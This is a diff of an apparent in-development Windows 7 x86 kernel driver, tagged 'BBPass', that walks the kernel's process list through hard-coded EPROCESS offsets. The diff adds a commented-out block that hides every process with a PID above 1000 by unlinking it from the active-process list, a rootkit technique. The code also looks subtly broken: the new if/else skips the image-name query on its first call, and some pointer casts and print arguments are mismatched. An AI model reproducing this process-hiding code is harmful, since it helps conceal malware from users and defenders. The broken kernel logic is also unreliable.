@@ -9,17 +9,21 @@ NTSTATUS GetProcessImageName(HANDLE hProc, PUNICODE_STRING procImg)
 	ULONG buffLength = 0;
 	PVOID buffer;
 	UNICODE_STRING routineName;
-	PVOID addrRoutine;
 
 	if(ZwQueryInformationProcess == NULL)
 	{
 		RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");
-		addrRoutine = (QUERY_INFO_PROCESS) 	MmGetSystemRoutineAddress(&routineName);
+		ZwQueryInformationProcess = (QUERY_INFO_PROCESS) 	MmGetSystemRoutineAddress(&routineName);
 
 		if(NULL == ZwQueryInformationProcess)
 		{
 			return STATUS_INSUFFICIENT_RESOURCES;
 		}
+
+	}
+
+	else
+	{
 
 		//Obtenemos el size del proceso =)
 		ret = ZwQueryInformationProcess(hProc, ProcessImageFileName, NULL, 0, &retLen);
@@ -56,61 +60,65 @@ NTSTATUS GetProcessImageName(HANDLE hProc, PUNICODE_STRING procImg)
 			imgName = (PUNICODE_STRING) buffer;
 			RtlCopyUnicodeString(procImg, imgName);
 		}
-
-		return ret;
 	}
-
-
 
 	return ret;
 }
 
 
-BOOLEAN ListProcess()
+BOOLEAN ListProcess()	
 {
-	unsigned long eproc, aux	, proc, ret;
-	PLIST_ENTRY listEntry;
+
+
+	unsigned long eProc, aux, proc, ret;
+	PLIST_ENTRY listEntry, listEntry_otra;
 	unsigned int pidProc = 0;
-	unsigned int i = 0;
+	int ii = 0;
 
 	//Obtenemos el System
-	eproc = (unsigned long) PsGetCurrentProcess();
+	eProc = (unsigned long) PsGetCurrentProcess();
 
 	//Punteros del siguiente y anterior proceso link
-	listEntry = (PLIST_ENTRY *) (eproc + OFFSET_PROCSLINKS_WIN7_X86);
+	listEntry = (PLIST_ENTRY *) (eProc + OFFSET_PROCSLINKS_WIN7_X86);
 
 
 
-	aux = (unsigned long) listEntry	;
+	aux = (unsigned long) listEntry->Blink;
 	proc = (unsigned long) listEntry;
 
 
 	pidProc = *((int *) (proc + OFFSET_PROCPID_WIN7_X86));	
 
 
-	DbgPrint("proc '%d' -  aux '%d'", proc, aux);
-
-/*
 	while(aux != proc)
-	{
-		proc = OFFSET_PROCSLINKS_WIN7_X86;
+	{		
+
+		proc-= OFFSET_PROCSLINKS_WIN7_X86;
 		ret = proc;
 
-		pidProc = *((int *) (proc + OFFSET_PROCPID_WIN7_X86));
+		pidProc = *((int *)(proc + OFFSET_PROCPID_WIN7_X86));
+		
+		//GetProcessName(pidProc);
+
+
+/*		if(pidProc > 1000)
+		{
+
+			DbgPrint(":: HIDDEN %d ::", pidProc);
+
+			listEntry_otra = (LIST_ENTRY *)(proc + OFFSET_PROCSLINKS_WIN7_X86);
+			listEntry_otra->Blink->Flink = listEntry_otra->Flink;
+			listEntry_otra->Flink->Blink = listEntry_otra->Blink;
+
+		}
+
+		DbgPrint("BBPass - foundPid '%d'", pidProc);
 */
-		// //GetProcessName(pidProc);
 
-		// DbgPrint("Holaaa");
+		listEntry = listEntry->Flink;
+		proc = (unsigned long) listEntry;
+	}
 
-		// listEntry = listEntry->Flink;
-		// proc = (unsigned long) listEntry;
-
-		// if(i==10)
-		// 	break;
-
-		// else
-		//i++;
-	//}
 
 
 	return TRUE;
@@ -173,6 +181,7 @@ BOOLEAN GetProcessName(unsigned int procId)
 	//Si status no es igual a NT_SUCCESS entonces FALSE contigo
 	if(!NT_SUCCESS(status))	
 	{
+		DbgPrint("BBPass - PsLookupProcessByProcessId() FALSE");
 		return FALSE;
 	}
 
@@ -183,6 +192,7 @@ BOOLEAN GetProcessName(unsigned int procId)
 
 	if(!NT_SUCCESS(status))
 	{
+		DbgPrint("BBPass - ObOpenObjectByPointer() FALSE");
 		ObDereferenceObject(eProc);
 		eProc = NULL;
 		return FALSE;				
@@ -198,6 +208,7 @@ BOOLEAN GetProcessName(unsigned int procId)
 
 	if(procImg.Buffer == NULL)
 	{
+		DbgPrint("BBPass - ExAllocatePoolWithTag() FALSE");
 		ZwClose(hProc);
 		ObDereferenceObject(eProc);
 		eProc = NULL;
@@ -206,9 +217,9 @@ BOOLEAN GetProcessName(unsigned int procId)
 	}
 
 	RtlZeroMemory(procImg.Buffer, procImg.MaximumLength);
-	status = GetProcessImageName(hProc, &procImg);
+	status = GetProcessImageName(hProc, &procImg);	
+	DbgPrint("AFUERAA '%wZ'", &procImg);
 
-	DbgPrint("BBPass - Proc found (kernelMode) '%s'", procImg);
 
 	return TRUE;
 }
